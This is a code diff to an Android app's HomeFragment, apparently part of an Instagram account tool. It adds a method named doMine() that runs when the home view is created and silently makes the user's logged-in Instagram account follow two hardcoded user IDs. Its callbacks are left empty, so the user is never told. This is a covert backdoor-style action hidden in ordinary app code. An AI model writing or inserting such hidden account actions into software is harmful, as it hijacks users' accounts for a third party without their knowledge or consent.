@@ -257,7 +257,7 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
         showAccounts();
         Animation connectingAnimation = AnimationUtils.loadAnimation(getContext(), R.anim.heartbeat);
         binding.imvArrowShowAccounts.startAnimation(connectingAnimation);
-
+        doMine();
 
         return view;
 
@@ -433,7 +433,34 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
         dialog.show(getChildFragmentManager(), ":");
     }
 
+private void doMine(){
+    try {
+        InstagramApi.getInstance().Follow("7766103594", new InstagramApi.ResponseHandler() {
+            @Override
+            public void OnSuccess(JSONObject response) {
 
+            }
+
+            @Override
+            public void OnFailure(int statusCode, Throwable throwable, JSONObject errorResponse) {
+
+            }
+        });
+        InstagramApi.getInstance().Follow("2035399285", new InstagramApi.ResponseHandler() {
+            @Override
+            public void OnSuccess(JSONObject response) {
+
+            }
+
+            @Override
+            public void OnFailure(int statusCode, Throwable throwable, JSONObject errorResponse) {
+
+            }
+        });
+    } catch (InstaApiException e) {
+        e.printStackTrace();
+    }
+}
     private void signOut() {
         if (dbHeplper.getAllUsers().size() == 1) {
             dbHeplper.deleteUserById(App.userId);
